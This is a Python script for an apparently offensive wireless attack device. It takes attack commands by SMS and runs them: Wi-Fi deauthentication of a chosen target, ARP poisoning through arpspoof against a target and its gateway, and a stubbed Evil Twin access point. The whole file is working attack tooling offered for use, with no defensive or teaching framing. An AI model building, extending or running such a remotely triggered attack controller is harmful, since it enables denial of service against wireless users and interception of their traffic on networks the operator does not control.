import time
import queue
import subprocess
import threading
from rich.console import Console
from sms import SMSExtractor
from deauth import Deauther

# Shared queue (commands from SMS and CLI)
command_queue = queue.Queue()

# SMS Extractor
extractor = SMSExtractor()
console = Console()

# Enable monitor mode on startup
subprocess.run(["bash", "monitor_mode.sh"])

# Background SMS monitoring service (always runs)
def sms_service():
    console.log("[green]Starting Background SMS Service...[/green]")
    while True:
        console.log("[blue]Checking for SMS commands...[/blue]")
        latest_sms = extractor.get_latest_sms()
        if latest_sms:
            console.log(f"[yellow]New SMS command received: {latest_sms[2]}[/yellow]")
            command_queue.put(latest_sms[2])  # Add SMS command to queue
        time.sleep(10)  # Run every 10 seconds

# Background command processor (executes commands)
def command_processor():
    while True:
        command = command_queue.get()  # Wait for a command
        console.log(f"[yellow]Processing command: {command}[/yellow]")

        parts = command.split(":")
        action = parts[0]

        if action == "deauth":
            target = parts[1]
            amount = int(parts[2])
            run_deauth(target, "wlan1", amount)
        elif action == "eviltwin":
            ssid = parts[1]
            start_evil_twin("wlan1", ssid)
        elif action == "arp_poison":
            target_ip = parts[1]
            gateway_ip = parts[2]
            run_arp_poison(target_ip, gateway_ip)
        else:
            console.log("[red]Unknown command![/red]")

        command_queue.task_done()  # Mark task as complete

# Run deauthentication attack
def run_deauth(target, interface, amount=50):
    console.log(f"[red]Running Deauth attack on {target} using {interface}[/red]")
    deauther = Deauther(target, interface, amount)
    deauther.deauth_attack()

# Start Evil Twin attack
def start_evil_twin(interface, ssid):
    console.log(f"[cyan]Starting Evil Twin attack with SSID: {ssid}[/cyan]")
    # Placeholder for Evil Twin attack setup

# Run ARP Poisoning attack
def run_arp_poison(target, gateway):
    console.log(f"[magenta]Running ARP Poisoning on {target} via {gateway}[/magenta]")
    subprocess.run(["arpspoof", "-i", "wlan1", "-t", target, gateway])

# Start background threads
threading.Thread(target=sms_service, daemon=True).start()
threading.Thread(target=command_processor, daemon=True).start()

# Keep running
while True:
    time.sleep(1)
